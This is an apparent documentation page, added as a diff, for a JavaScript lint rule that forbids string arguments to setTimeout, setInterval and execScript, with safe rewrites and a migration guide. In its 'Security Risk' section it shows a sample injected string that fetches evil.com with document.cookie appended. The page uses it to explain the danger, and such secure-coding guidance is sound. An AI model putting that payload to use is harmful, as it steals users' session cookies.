@@ -1,0 +1,290 @@
+---
+title: no-implied-eval
+description: Disallow implied eval() via setTimeout() and setInterval()
+---
+
+# no-implied-eval
+
+Using string arguments with `setTimeout()`, `setInterval()`, or `execScript()` is an implied `eval()` with similar security and performance concerns.
+
+<Note>
+**Rule Type:** Suggestion  
+**Fixable:** No
+</Note>
+
+## Why This Rule Exists
+
+Passing strings to timer functions is evaluated like `eval()`:
+
+- **Security risks**: String code can be exploited
+- **Performance**: Can't be optimized
+- **Global scope**: Executes in global scope
+- **Better alternative**: Pass functions instead
+
+## Rule Details
+
+This rule disallows string arguments to `setTimeout()`, `setInterval()`, and `execScript()`.
+
+## Examples
+
+### Incorrect Code
+
+```js
+setTimeout("alert('Hi!');", 100);
+
+setInterval("alert('Hi!');", 100);
+
+execScript("alert('Hi!')");
+
+window.setTimeout("count = 5", 10);
+
+window.setInterval("foo = bar", 10);
+```
+
+### Correct Code
+
+```js
+setTimeout(function() {
+    alert("Hi!");
+}, 100);
+
+setInterval(function() {
+    alert("Hi!");
+}, 100);
+
+// Modern syntax
+setTimeout(() => {
+    alert("Hi!");
+}, 100);
+```
+
+## Understanding Implied Eval
+
+### How String Arguments Work
+
+<Warning>
+String arguments to setTimeout/setInterval are evaluated like eval().
+</Warning>
+
+```js
+// These are equivalent:
+setTimeout("doSomething()", 1000);
+setTimeout(function() {
+    eval("doSomething()");
+}, 1000);
+
+// This is safe:
+setTimeout(function() {
+    doSomething();
+}, 1000);
+```
+
+### Security Risk
+
+```js
+// Vulnerable to injection
+function scheduleAction(userAction) {
+    setTimeout(userAction, 1000);
+}
+
+// Attacker provides: "fetch('evil.com?cookie=' + document.cookie)"
+scheduleAction(attackerString);
+```
+
+## Common Patterns and Fixes
+
+### Simple Function Call
+
+```js
+// Wrong
+setTimeout("doSomething()", 1000);
+
+// Right
+setTimeout(doSomething, 1000);
+
+// Or with arrow function
+setTimeout(() => doSomething(), 1000);
+```
+
+### With Arguments
+
+```js
+// Wrong
+setTimeout("doSomething(" + x + ", " + y + ")", 1000);
+
+// Right
+setTimeout(() => doSomething(x, y), 1000);
+
+// Or use bind
+setTimeout(doSomething.bind(null, x, y), 1000);
+```
+
+### Multiple Statements
+
+```js
+// Wrong
+setTimeout("foo(); bar();", 1000);
+
+// Right
+setTimeout(() => {
+    foo();
+    bar();
+}, 1000);
+```
+
+### Dynamic Code
+
+```js
+// Wrong
+const code = "count++";
+setInterval(code, 1000);
+
+// Right - restructure to use a function
+setInterval(() => {
+    count++;
+}, 1000);
+```
+
+### Global Variable Assignment
+
+```js
+// Wrong
+setTimeout("window.loaded = true", 100);
+
+// Right
+setTimeout(() => {
+    window.loaded = true;
+}, 100);
+```
+
+## Performance Comparison
+
+```js
+// Slower: String must be parsed and evaluated
+for (let i = 0; i < 1000; i++) {
+    setTimeout("doWork()", i);
+}
+
+// Faster: Function reference
+for (let i = 0; i < 1000; i++) {
+    setTimeout(doWork, i);
+}
+
+// Fastest: Reuse same function
+const callback = () => doWork();
+for (let i = 0; i < 1000; i++) {
+    setTimeout(callback, i);
+}
+```
+
+## Modern Alternatives
+
+### Arrow Functions
+
+```js
+// Clean and concise
+setTimeout(() => console.log('Hello'), 1000);
+
+setInterval(() => {
+    updateUI();
+    checkStatus();
+}, 5000);
+```
+
+### Function References
+
+```js
+// When no arguments needed
+setTimeout(handleTimeout, 1000);
+setInterval(checkUpdates, 5000);
+```
+
+### Bound Functions
+
+```js
+// Passing arguments
+const boundFn = handleClick.bind(null, itemId, data);
+setTimeout(boundFn, 1000);
+```
+
+## execScript
+
+<Note>
+`execScript()` is an Internet Explorer-only function that's now obsolete.
+</Note>
+
+```js
+// Never do this (IE only, deprecated)
+execScript("const x = 5");
+
+// Just write normal code
+const x = 5;
+```
+
+## Scope Differences
+
+```js
+function test() {
+    let localVar = 'local';
+    
+    // String eval runs in GLOBAL scope
+    setTimeout("console.log(localVar)", 100); // ReferenceError!
+    
+    // Function runs in closure scope  
+    setTimeout(() => console.log(localVar), 100); // Works!
+}
+```
+
+## Migration Guide
+
+### Find All Instances
+
+```bash
+# Search for string arguments
+grep -r 'setTimeout.*["\']' src/
+grep -r 'setInterval.*["\']' src/
+```
+
+### Automated Fix
+
+```js
+// Before
+setTimeout("updateUI()", 1000);
+setInterval("check()", 5000);
+
+// After
+setTimeout(() => updateUI(), 1000);
+setInterval(() => check(), 5000);
+```
+
+### Complex Cases
+
+```js
+// Before
+setTimeout("obj.method(" + param + ")", 1000);
+
+// After
+setTimeout(() => obj.method(param), 1000);
+```
+
+## When Not to Use It
+
+This rule should almost never be disabled. If you think you need string arguments to timers:
+
+1. Restructure to use functions
+2. If truly impossible, document why and use eval alternatives
+
+## Configuration
+
+```js
+{
+  "rules": {
+    "no-implied-eval": "error"
+  }
+}
+```
+
+## Related Rules
+
+- [no-eval](/rules/no-eval)
+- [no-new-func](/rules/no-new-func)
